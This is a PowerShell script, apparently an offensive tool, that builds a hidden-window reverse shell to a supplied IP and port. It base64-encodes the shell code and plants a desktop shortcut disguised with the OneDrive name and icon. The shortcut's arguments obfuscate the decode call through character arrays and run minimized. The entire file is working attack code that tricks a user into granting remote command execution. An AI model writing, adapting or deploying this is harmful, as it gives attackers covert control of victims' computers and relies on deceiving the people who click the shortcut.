param([string]$ip,[string]$port)

#oneliner rev shell
$code=@'
Add-Type -name y -names x -m '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr a, Int32 b);';[x.y]::ShowWindow([x.y]::GetConsoleWindow(), 0)
$x=(New-Object System.Net.Sockets.TCPClient("~",^)).getstream();[byte[]]$b=0..65535|%{0};while(($i=$x.Read($b,0,$b.Length))-ne 0){$d=([text.encoding]::ASCII).GetBytes(((i''ex((New-Object -t System.Text.ASCIIEncoding).GetString($b,0,$i))2>&1|Out-String)+(pwd).Path+"> "));$x.Write($d,0,$d.Length);$x.Flush()}
'@ -replace '~',$ip -replace '\^',$port


#convert code to base64
$b64 = [Convert]::ToBase64String(([System.Text.Encoding]::ascii.GetBytes($code)))


#making the lnk file
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("C:\Users\"+$env:USERNAME+"\Desktop\onedrive.lnk")
$Shortcut.RelativePath =  "powershell"
$Shortcut.IconLocation = "C:\Windows\SysWOW64\OneDrive.ico"
$Shortcut.TargetPath = "powershell"
$Shortcut.Arguments = ("[System.Text.Encoding]::([char[]](97,83,99,105,73)-join'').([char[]](103,69,84,115,116,82,73,110,103)-join'')([System.Convert]::([char[]](102,82,111,77,98,65,115,69,54,52,115,84,114,73,78,103)-join'')('"+$b64+"'))|powershell")
$Shortcut.WindowStyle = 7
$Shortcut.Save()
